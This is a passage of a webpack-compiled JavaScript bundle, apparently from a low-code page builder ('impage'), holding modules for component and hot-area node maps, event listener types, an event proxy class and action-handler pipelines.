  react_dom__WEBPACK_IMPORTED_MODULE_1___default.a.render( /*#__PURE__*/react__WEBPACK_IMPORTED_MODULE_0___default.a.createElement(_src_app__WEBPACK_IMPORTED_MODULE_2__[/* default */ "a"], null), container);
} // 你也可以在此文件中进行一些初始化操作：
// 如引入公共样式、初始化上报等。

/***/ }),

/***/ 17:
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "a", function() { return componentNodeMap; });
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "d", function() { return setComponentNode; });
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "b", function() { return deleteComponentNode; });
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "c", function() { return getComponentNode; });
/* harmony import */ var _utils_common__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(19);

const componentNodeMap = new Map();
function setComponentNode(key, node) {
  return componentNodeMap.set(key, node);
}
function deleteComponentNode(key) {
  return componentNodeMap.delete(key);
}
function getComponentNode(key) {
  return componentNodeMap.get(key) || document.getElementById(Object(_utils_common__WEBPACK_IMPORTED_MODULE_0__[/* getComponentId */ "a"])(key));
}

if (typeof window !== 'undefined' && !window.__componentInstanceNodeMap) {
  Object.defineProperty(window, '__componentInstanceNodeMap', {
    get() {
      return componentNodeMap;
    }

  });
}

/***/ }),

/***/ 18:
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";

// EXPORTS
__webpack_require__.d(__webpack_exports__, "a", function() { return /* binding */ generateComponentActionParams; });
__webpack_require__.d(__webpack_exports__, "b", function() { return /* binding */ generateHotareaActionParams; });
__webpack_require__.d(__webpack_exports__, "d", function() { return /* binding */ generatePluginParams; });
__webpack_require__.d(__webpack_exports__, "c", function() { return /* binding */ generatePluginEventListenerCallbackParams; });
__webpack_require__.d(__webpack_exports__, "e", function() { return /* binding */ getComponentData; });

// UNUSED EXPORTS: ACTION_TRIGGER_PREFIX, getHotAreaData

// EXTERNAL MODULE: ./handlers/shared/eventListener/types.js
var types = __webpack_require__(41);

// EXTERNAL MODULE: ./handlers/shared/eventListener/pageEventListener.js
var pageEventListener = __webpack_require__(113);

// EXTERNAL MODULE: ./handlers/shared/eventListener/componentEventListener.js
var componentEventListener = __webpack_require__(114);

// EXTERNAL MODULE: ./handlers/shared/eventListener/hotAreaEventListener.js
var hotAreaEventListener = __webpack_require__(156);

// CONCATENATED MODULE: ./handlers/shared/eventListener/on.js

 // eslint-disable-next-line import/no-cycle

 // eslint-disable-next-line import/no-cycle


function on(target, eventType, callback) {
  switch (target) {
    case types["a" /* EventListenerTarget */].PAGE:
      {
        return Object(pageEventListener["b" /* onPage */])(eventType, callback);
      }

    case types["a" /* EventListenerTarget */].COMPONENT:
      {
        return Object(componentEventListener["b" /* onComponent */])(eventType, callback);
      }

    case types["a" /* EventListenerTarget */].HOT_AREA:
      {
        return Object(hotAreaEventListener["b" /* onHotArea */])(eventType, callback);
      }

    default:
      {
        // eslint-disable-next-line
        throw `Invalid [target], must one of '${types["a" /* EventListenerTarget */].PAGE}', '${types["a" /* EventListenerTarget */].COMPONENT}', '${types["a" /* EventListenerTarget */].HOT_AREA}'`;
      }
  }
}
// EXTERNAL MODULE: ./handlers/shared/componentNodeMap.js
var componentNodeMap = __webpack_require__(17);

// EXTERNAL MODULE: ./handlers/shared/hotAreaNodeMap.js
var hotAreaNodeMap = __webpack_require__(67);

// CONCATENATED MODULE: ./handlers/shared/actionParams.js
// eslint-disable-next-line import/no-cycle



const ACTION_TRIGGER_PREFIX = '__impage_action_trigger_';
function generateComponentActionParams(action, instance, global, meta) {
  const {
    data,
    key,
    trigger
  } = action;
  return {
    key,
    data,
    triggerEventType: trigger.replace(ACTION_TRIGGER_PREFIX, ''),
    trigger: {
      type: 'component',
      component: getComponentData(instance)
    },
    meta,
    global,
    componentsMap: componentNodeMap["a" /* componentNodeMap */],
    getComponentByKey: componentNodeMap["c" /* getComponentNode */]
  };
}
function generateHotareaActionParams(action, hotArea, component, global, meta) {
  const params = generateComponentActionParams(action, component, global, meta);
  params.trigger.type = 'hotarea';
  params.trigger.hotarea = getHotAreaData(hotArea, component);
  return params;
}
function generatePluginParams(plugin, global, meta) {
  const {
    key,
    data
  } = plugin;
  return {
    key,
    data,
    meta,
    global,
    on: on,
    componentsMap: componentNodeMap["a" /* componentNodeMap */],
    getComponentByKey: componentNodeMap["c" /* getComponentNode */]
  };
}
function generatePluginEventListenerCallbackParams(eventType, global, meta, component, hotArea) {
  const componentData = getComponentData(component);
  const hotAreaData = hotArea ? getHotAreaData(hotArea, component) : undefined;
  return {
    meta,
    global,
    triggerEventType: eventType,
    trigger: {
      type: hotArea ? 'hotarea' : 'component',
      component: componentData,
      hotarea: hotAreaData
    },
    component: componentData,
    hotArea: hotAreaData
  };
}
function getComponentData({
  key,
  component: {
    id,
    info,
    name,
    projId,
    projKey
  }
}) {
  return {
    key,
    id,
    info,
    name,
    projId,
    projKey,

    get node() {
      return Object(componentNodeMap["c" /* getComponentNode */])(key);
    }

  };
}
function getHotAreaData({
  key,
  position,
  size
}, component) {
  return {
    key,
    position,
    size,
    parent: getComponentData(component),

    get node() {
      return Object(hotAreaNodeMap["b" /* getHotAreaNode */])(key);
    }

  };
}

/***/ }),

/***/ 19:
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "a", function() { return getComponentId; });
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "b", function() { return getHotAreaId; });
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "c", function() { return withPersistReactEvent; });
function getComponentId(key) {
  return `__impage-component-wrapper-${key}`;
}
function getHotAreaId(key) {
  return `__impage-hotarea-wrapper-${key}`;
}
function withPersistReactEvent(handler) {
  return e => {
    e.persist();
    return handler(e);
  };
}

/***/ }),

/***/ 20:
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "a", function() { return EventEmitTypes; });
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "b", function() { return events; });
/* harmony import */ var _eventProxy__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(40);

const EventEmitTypes = {
  COMPONENT_INTERSECTING_CHANGE: 'component_intersecting_change',
  HOT_AREA_INTERSECTING_CHANGE: 'hot_area_intersecting_change'
};
const events = new _eventProxy__WEBPACK_IMPORTED_MODULE_0__[/* EventProxy */ "a"]();

/***/ }),

/***/ 345:
/***/ (function(module, exports, __webpack_require__) {

// extracted by mini-css-extract-plugin

/***/ }),

/***/ 40:
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "a", function() { return EventProxy; });
function _defineProperty(obj, key, value) { if (key in obj) { Object.defineProperty(obj, key, { value: value, enumerable: true, configurable: true, writable: true }); } else { obj[key] = value; } return obj; }

class EventProxy {
  constructor() {
    _defineProperty(this, "proxies", {});

    _defineProperty(this, "onceProxies", {});

    _defineProperty(this, "on", (eventName, handler) => {
      if (this.proxies[eventName]) {
        return this.proxies[eventName].push(handler);
      }

      this.proxies[eventName] = [handler];
    });

    _defineProperty(this, "only", (eventName, handler) => {
      this.proxies[eventName] = [handler];
    });

    _defineProperty(this, "once", (eventName, handler) => {
      if (this.onceProxies[eventName]) {
        return this.onceProxies[eventName].push(handler);
      }

      this.onceProxies[eventName] = [handler];
    });

    _defineProperty(this, "emit", (eventName, ...args) => {
      if (this.proxies[eventName]) {
        this.proxies[eventName].forEach(handler => handler(...args));
      }

      if (this.onceProxies[eventName]) {
        this.onceProxies[eventName].forEach(handler => handler(...args));
        this.onceProxies[eventName] = [];
      }
    });

    _defineProperty(this, "cancel", (eventName, handler) => {
      if (!this.proxies[eventName]) {
        return;
      }

      this.proxies[eventName] = this.proxies[eventName].filter(h => h !== handler);
    });

    _defineProperty(this, "cancelOnce", (eventName, handler) => {
      if (!this.onceProxies[eventName]) {
        return;
      }

      this.onceProxies[eventName] = this.onceProxies[eventName].filter(h => h !== handler);
    });

    _defineProperty(this, "cancelAll", eventName => {
      if (!this.proxies[eventName]) {
        return;
      }

      this.proxies[eventName] = [];
    });

    _defineProperty(this, "cancelAllOnce", eventName => {
      if (!this.onceProxies[eventName]) {
        return;
      }

      this.onceProxies[eventName] = [];
    });

    _defineProperty(this, "clear", () => {
      this.proxies = {};
      this.onceProxies = {};
    });
  }

}

/***/ }),

/***/ 41:
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "a", function() { return EventListenerTarget; });
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "b", function() { return PageEventListenerTypes; });
/* unused harmony export ComponentEventListenerTypes */
/* unused harmony export HotAreaEventListenerTypes */
const EventListenerTarget = {
  PAGE: 'page',
  COMPONENT: 'component',
  HOT_AREA: 'hotarea'
};
/**
 * @desc Page Events
 */

const PageEventListenerTypes = {
  INIT: 'afterRender'
};
/**
 * @desc Component Events
 */

const ComponentEventListenerTypes = {
  INIT: 'afterRender',
  CLICK: 'click',
  MOUSE_ENTER: 'mouseEnter',
  MOUSE_LEAVE: 'mouseLeave',
  DOUBLE_CLICK: 'doubleClick',
  LONG_PRESS: 'longPress',
  ENTER_VIEW: 'enterView',
  LEAVE_VIEW: 'leaveView'
};
/**
 * @desc HotArea Events
 */

const HotAreaEventListenerTypes = ComponentEventListenerTypes;

/***/ }),

/***/ 60:
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "b", function() { return pipeActions; });
/* unused harmony export generateHandler */
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "a", function() { return generateHandlers; });
/* harmony import */ var promise_timeout__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(155);
/* harmony import */ var promise_timeout__WEBPACK_IMPORTED_MODULE_0___default = /*#__PURE__*/__webpack_require__.n(promise_timeout__WEBPACK_IMPORTED_MODULE_0__);
/* harmony import */ var _types__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(7);
/* harmony import */ var _instanceMap__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(82);
/* harmony import */ var _actionParams__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(18);




const DEFAULT_MAX_TIMEOUT = 10 * 1000;
function pipeActions(actions, component, hotArea, payload) {
  return async (originalEvent, {
    meta,
    global
  }) => {
    for (const iAction of actions) {
      const {
        action: {
          action: actionFn,
          maxTimeout = DEFAULT_MAX_TIMEOUT
        },
        target
      } = iAction;
      const params = hotArea ? Object(_actionParams__WEBPACK_IMPORTED_MODULE_3__[/* generateHotareaActionParams */ "b"])(iAction, hotArea, component, global, meta) : Object(_actionParams__WEBPACK_IMPORTED_MODULE_3__[/* generateComponentActionParams */ "a"])(iAction, component, global, meta);
      params.payload = payload;

      if (originalEvent) {
        params.originalEvent = originalEvent;
      }

      if (typeof target === 'number') {
        params.target = Object(_actionParams__WEBPACK_IMPORTED_MODULE_3__[/* getComponentData */ "e"])(Object(_instanceMap__WEBPACK_IMPORTED_MODULE_2__[/* getComponentInstance */ "a"])(target));
      }

      const fn = typeof actionFn === 'object' ? actionFn.action : actionFn;

      try {
        if (maxTimeout === 'Infinity') {
          await fn(params);
        } else {
          const p = fn(params);

          if (p instanceof Promise) {
            await Object(promise_timeout__WEBPACK_IMPORTED_MODULE_0__["timeout"])(fn(params), maxTimeout);
          }
        }
      } catch (e) {
        console.error('Action throw error: ', e);
      }
    }
  };
}
function generateHandler(actions, trigger, component, hotArea) {
  if (!actions || !actions.length) {
    return undefined;
  }

  const iActions = actions.filter(a => a.trigger === trigger);

  if (!iActions.length) {
    return undefined;
  }

  return pipeActions(iActions, component, hotArea);
}
function generateHandlers(actions, component, hotArea) {
  const handlers = {};
  const onInit = generateHandler(actions, _types__WEBPACK_IMPORTED_MODULE_1__[/* BaseActionTrigger */ "a"].INIT, component, hotArea);

  if (onInit) {
    handlers.onInit = onInit;
  }

  const onClick = generateHandler(actions, _types__WEBPACK_IMPORTED_MODULE_1__[/* BaseActionTrigger */ "a"].CLICK, component, hotArea);

  if (onClick) {
    handlers.onClick = onClick;
  }

  const onMouseEnter = generateHandler(actions, _types__WEBPACK_IMPORTED_MODULE_1__[/* BaseActionTrigger */ "a"].MOUSE_ENTER, component, hotArea);

  if (onMouseEnter) {
    handlers.onMouseEnter = onMouseEnter;
  }

  const onMouseLeave = generateHandler(actions, _types__WEBPACK_IMPORTED_MODULE_1__[/* BaseActionTrigger */ "a"].MOUSE_LEAVE, component, hotArea);

  if (onMouseLeave) {
    handlers.onMouseLeave = onMouseLeave;
  }

  const onDoubleClick = generateHandler(actions, _types__WEBPACK_IMPORTED_MODULE_1__[/* BaseActionTrigger */ "a"].DOUBLE_CLICK, component, hotArea);

  if (onDoubleClick) {
    handlers.onDoubleClick = onDoubleClick;
  }

  const onLongPress = generateHandler(actions, _types__WEBPACK_IMPORTED_MODULE_1__[/* BaseActionTrigger */ "a"].LONG_PRESS, component, hotArea);

  if (onLongPress) {
    handlers.onLongPress = onLongPress;
  }

  const onEnterView = generateHandler(actions, _types__WEBPACK_IMPORTED_MODULE_1__[/* BaseActionTrigger */ "a"].ENTER_VIEW, component, hotArea);

  if (onEnterView) {
    handlers.onEnterView = onEnterView;
  }

  const onLeaveView = generateHandler(actions, _types__WEBPACK_IMPORTED_MODULE_1__[/* BaseActionTrigger */ "a"].LEAVE_VIEW, component, hotArea);

  if (onLeaveView) {
    handlers.onLeaveView = onLeaveView;
  }

  return handlers;
}

/***/ }),

/***/ 67:
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
/* unused harmony export hotAreaNodeMap */
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "c", function() { return setHotAreaNode; });
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "a", function() { return deleteHotAreaNode; });
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "b", function() { return getHotAreaNode; });
/* harmony import */ var _utils_common__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(19);

const hotAreaNodeMap = new Map();
function setHotAreaNode(key, node) {
  hotAreaNodeMap.set(key, node);
}
function deleteHotAreaNode(key) {
  return hotAreaNodeMap.delete(key);
}
function getHotAreaNode(key) {
  return hotAreaNodeMap.get(key) || document.getElementById(Object(_utils_common__WEBPACK_IMPORTED_MODULE_0__[/* getHotAreaId */ "b"])(key));
}

if (typeof window !== 'undefined' && !window.__hotAreaInstanceNodeMap) {
  Object.defineProperty(window, '__hotAreaInstanceNodeMap', {
    get() {
      return hotAreaNodeMap;
    }

  });
}

/***/ }),

/***/ 7:
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "a", function() { return BaseActionTrigger; });
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "b", function() { return ComponentEventListenerTypes; });
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "c", function() { return HotAreaEventListenerTypes; });
const BaseActionTrigger = {
  INIT: '__impage_action_trigger_init',
  CLICK: '__impage_action_trigger_click',
  MOUSE_ENTER: '__impage_action_trigger_mouseEnter',
  MOUSE_LEAVE: '__impage_action_trigger_mouseLeave',
  DOUBLE_CLICK: '__impage_action_trigger_double_click',
  LONG_PRESS: '__impage_action_trigger_long_press',
  ENTER_VIEW: '__impage_action_trigger_enter_view',
  LEAVE_VIEW: '__impage_action_trigger_leave_view'
};
const ComponentEventListenerTypes = {
  INIT: 'afterRender',
  CLICK: 'click',
  MOUSE_ENTER: 'mouseEnter',
  MOUSE_LEAVE: 'mouseLeave',
  DOUBLE_CLICK: 'doubleClick',
  LONG_PRESS: 'longPress',
  ENTER_VIEW: 'enterView',
  LEAVE_VIEW: 'leaveView'
};
const HotAreaEventListenerTypes = ComponentEventListenerTypes;

/***/ }),

/***/ 82:
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "b", function() { return initComponentInstanceIndexMap; });
/* unused harmony export getComponentInstanceIndex */
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "a", function() { return getComponentInstance; });
let instances = null;
const componentInstanceIndexMap = new Map();
function initComponentInstanceIndexMap(componentInstances) {
  instances = componentInstances;
  return generateComponentInstanceIndexMap(instances);
}

function generateComponentInstanceIndexMap() {
  componentInstanceIndexMap.clear();
  instances.forEach(({
    key,
    children
  }, index) => {
    if (children) {
      children.forEach(({
        key
      }, childIndex) => setComponentInstanceIndex(key, childIndex, index));
    }

    setComponentInstanceIndex(key, index);
  });

  function setComponentInstanceIndex(key, index, parentIndex) {
    return componentInstanceIndexMap.set(key, {
      index,
      parentIndex
    });
  }
}

function getComponentInstanceIndex(key) {
  return componentInstanceIndexMap.get(key);
}
function getComponentInstance(key) {
  const iIndex = getComponentInstanceIndex(key);

  if (!iIndex) {
    return null;
  }

  const {
    index,
    parentIndex
  } = iIndex;
  let componentInstances = instances;

  if (typeof parentIndex === 'number') {
    componentInstances = componentInstances[parentIndex].children;
  }

  return componentInstances[index];
}

/***/ }),

/***/ 83:
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "a", function() { return emitCustomEvent; });
/* harmony import */ var _actionHandler_utils__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(60);

function emitCustomEvent(instance, trigger, global, meta, payload) {
  const actions = instance.actions.filter(i => i.trigger === trigger);

  if (!actions.length) {
    return;
  }

  const handler = Object(_actionHandler_utils__WEBPACK_IMPORTED_MODULE_0__[/* pipeActions */ "b"])(actions, instance, null, payload);
  return handler(undefined, {
    global,
    meta
  });
}

/***/ }),

/***/ 84:
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "a", function() { return onComponentEventAction; });
/* unused harmony export getComponentEventActionCallbacks */
const actionCallbackMap = new Map();
function onComponentEventAction({
  key
}, iEventName, callback) {
  const eventName = `__impage__component-event-${iEventName}`;
  const map = getCallbackMap(key);

  if (!map) {
    return actionCallbackMap.set(key, new Map([[eventName, [callback]]]));
  }

  const callbacks = map.get(eventName);

  if (!callbacks) {
    return map.set(eventName, [callback]);
  }

  callbacks.push(callback);
}

function getCallbackMap(componentKey) {
  return actionCallbackMap.get(componentKey);
}

function getComponentEventActionCallbacks(componentKey, eventName) {
  const map = getCallbackMap(componentKey);

  if (!map) {
    return null;
  }

  return map.get(eventName);
}

/***/ })

/******/ })["default"];}